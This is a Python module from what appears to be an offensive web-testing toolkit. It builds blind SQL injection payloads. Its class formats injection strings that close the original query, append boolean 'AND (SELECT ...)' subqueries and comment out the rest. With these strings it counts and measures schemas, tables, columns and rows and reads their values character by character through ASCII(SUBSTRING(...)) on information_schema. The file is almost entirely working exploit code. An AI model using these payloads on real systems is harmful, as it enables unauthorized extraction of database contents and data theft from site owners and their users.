# author: WatchDogOblivion
# description: TODO
# WatchDogs Blind SQL Request Response Queries

from watchdogs.base.models import AllArgs  # pylint: disable=unused-import
from watchdogs.web.models import BlindSQLRRHelper  # pylint: disable=unused-import
from watchdogs.web.parsers import BlindSQLArgs

from watchdogs.utils.Constants import (COUNT, LENGTH, SQL_COLUMN_NAME, SQL_SCHEMATA, SQL_TABLES, VALUE)

ORPH = 'OPERATOR_PLACE_HOLDER'
ODPH = 'OPERAND_PLACE_HOLDER'
CIPH = 'CHARACTER_INDEX_PLACE_HOLDER'
RIPH = 'ROW_INDEX_PLACE_HOLDER'


class BlindSQLRRQueries(object):

  @staticmethod
  def getLengthQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = "{0}{1}AND{1}(SELECT{1}LENGTH({2})){3}{4}{5}"
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getQueryKey(), ORPH, ODPH,
                        blindSQLArgs.commentOut)

  @staticmethod
  def getValueQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = "{0}{1}AND{1}(SELECT{1}ASCII(SUBSTRING({2},{1}{3},{1}1))){4}{5}{6}"
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getQueryKey(), CIPH, ORPH,
                        ODPH, blindSQLArgs.commentOut)

  @staticmethod
  def getCountQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = "{0}{1}AND{1}(SELECT{1}COUNT(*){1}FROM{1}{2}){3}{4}{5}"
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getTableName(), ORPH,
                        ODPH, blindSQLArgs.commentOut)

  @staticmethod
  def getTableCountQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = "{0}{1}AND{1}(SELECT{1}COUNT(*){1}FROM{1}{2}{1}WHERE{1}table_schema='{3}'){4}{5}{6}"
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getTableName(),
                        helper.getDatabaseName(), ORPH, ODPH, blindSQLArgs.commentOut)

  @staticmethod
  def getColumnCountQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = ("{0}{1}AND{1}"
             "(SELECT{1}COUNT({2}){1}FROM{1}information_schema.columns{1}"
             "WHERE{1}table_schema='{3}'{1}AND{1}table_name='{4}')"
             "{5}{6}{7}")
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getColumnName(),
                        helper.getDatabaseName(), helper.getTableName(), ORPH, ODPH, blindSQLArgs.commentOut)

  @staticmethod
  def getRowCountQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = ("{0}{1}AND{1}(SELECT{1}COUNT(*){1}FROM{1}{2}.{3}){4}{5}{6}")
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getDatabaseName(),
                        helper.getTableName(), ORPH, ODPH, blindSQLArgs.commentOut)

  @staticmethod
  def getFQLengthQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = "{0}{1}AND{1}(SELECT{1}LENGTH((SELECT{1}{2}{1}FROM{1}{3}{1}LIMIT{1}{4},1))){5}{6}{7}"
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getColumnName(),
                        helper.getTableName(), RIPH, ORPH, ODPH, blindSQLArgs.commentOut)

  @staticmethod
  def getTableLengthQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = (
        "{0}{1}AND{1}"
        "(SELECT{1}LENGTH(table_name){1}FROM{1}{2}{1}WHERE{1}table_schema='{3}'{1}LIMIT{1}{4},1){5}{6}{7}")
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getTableName(),
                        helper.getDatabaseName(), RIPH, ORPH, ODPH, blindSQLArgs.commentOut)

  @staticmethod
  def getColumnLengthQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = ("{0}{1}AND{1}"
             "(SELECT{1}LENGTH({2}){1}FROM{1}information_schema.columns{1}"
             "WHERE{1}table_schema='{3}'{1}AND{1}table_name='{4}'{1}LIMIT{1}{5},1)"
             "{6}{7}{8}")
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getColumnName(),
                        helper.getDatabaseName(), helper.getTableName(), RIPH, ORPH, ODPH,
                        blindSQLArgs.commentOut)

  @staticmethod
  def getRowLengthQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = ("{0}{1}AND{1}(SELECT{1}LENGTH({2}){1}FROM{1}{3}.{4}{1}LIMIT{1}{5},1){6}{7}{8}")
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getColumnName(),
                        helper.getDatabaseName(), helper.getTableName(), RIPH, ORPH, ODPH,
                        blindSQLArgs.commentOut)

  @staticmethod
  def getFQValueQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = ("{0}{1}AND{1}"
             "(SELECT{1}ASCII(SUBSTRING((SELECT{1}{2}{1}FROM{1}{3}{1}LIMIT{1}{4},1),{5},1))){6}{7}{8}")
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getColumnName(),
                        helper.getTableName(), RIPH, CIPH, ORPH, ODPH, blindSQLArgs.commentOut)

  @staticmethod
  def getFQTableValueQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = ("{0}{1}AND{1}"
             "(SELECT{1}ASCII(SUBSTRING("
             "(SELECT{1}{2}{1}FROM{1}{3}{1}WHERE{1}table_schema='{4}'{1}LIMIT{1}{5},1)"
             ",{6},1))){7}{8}{9}")
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getColumnName(),
                        helper.getTableName(), helper.getDatabaseName(), RIPH, CIPH, ORPH, ODPH,
                        blindSQLArgs.commentOut)

  @staticmethod
  def getColumnValueQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = ("{0}{1}AND{1}"
             "(SELECT{1}ASCII(SUBSTRING("
             "(SELECT{1}{2}{1}FROM{1}information_schema.columns{1}"
             "WHERE{1}table_schema='{3}'{1}AND{1}table_name='{4}'{1}LIMIT{1}{5},1)"
             ",{1}{6},{1}1))){7}{8}{9}")
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getColumnName(),
                        helper.getDatabaseName(), helper.getTableName(), RIPH, CIPH, ORPH, ODPH,
                        blindSQLArgs.commentOut)

  @staticmethod
  def getRowValueQuery(allArgs, helper):
    # type: (AllArgs, BlindSQLRRHelper) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = ("{0}{1}AND{1}"
             "(SELECT{1}ASCII(SUBSTRING("
             "(SELECT{1}{2}{1}FROM{1}{3}.{4}{1}LIMIT{1}{5},1)"
             ",{6},1))){7}{8}{9}")
    return query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, helper.getColumnName(),
                        helper.getDatabaseName(), helper.getTableName(), RIPH, CIPH, ORPH, ODPH,
                        blindSQLArgs.commentOut)

  @staticmethod
  def setQuery(typ, allArgs, helper):  # pylint: disable=too-many-branches
    #type: (str, AllArgs, BlindSQLRRHelper) -> None
    if (typ == COUNT):
      if (helper.getTableName() == SQL_SCHEMATA):
        helper.setQuery(BlindSQLRRQueries.getCountQuery(allArgs, helper))
      elif (helper.getTableName() == SQL_TABLES):
        helper.setQuery(BlindSQLRRQueries.getTableCountQuery(allArgs, helper))
      elif (helper.getColumnName() == SQL_COLUMN_NAME):
        helper.setQuery(BlindSQLRRQueries.getColumnCountQuery(allArgs, helper))
      else:
        helper.setQuery(BlindSQLRRQueries.getRowCountQuery(allArgs, helper))
    elif (typ == LENGTH):
      if (helper.getTableName() == SQL_SCHEMATA):
        helper.setQuery(BlindSQLRRQueries.getFQLengthQuery(allArgs, helper))
      elif (helper.getTableName() == SQL_TABLES):
        helper.setQuery(BlindSQLRRQueries.getTableLengthQuery(allArgs, helper))
      elif (helper.getColumnName() == SQL_COLUMN_NAME):
        helper.setQuery(BlindSQLRRQueries.getColumnLengthQuery(allArgs, helper))
      else:
        helper.setQuery(BlindSQLRRQueries.getRowLengthQuery(allArgs, helper))
    elif (typ == VALUE):
      if (helper.getTableName() == SQL_SCHEMATA):
        helper.setQuery(BlindSQLRRQueries.getFQValueQuery(allArgs, helper))
      elif (helper.getTableName() == SQL_TABLES):
        helper.setQuery(BlindSQLRRQueries.getFQTableValueQuery(allArgs, helper))
      elif (helper.getColumnName() == SQL_COLUMN_NAME):
        helper.setQuery(BlindSQLRRQueries.getColumnValueQuery(allArgs, helper))
      else:
        helper.setQuery(BlindSQLRRQueries.getRowValueQuery(allArgs, helper))
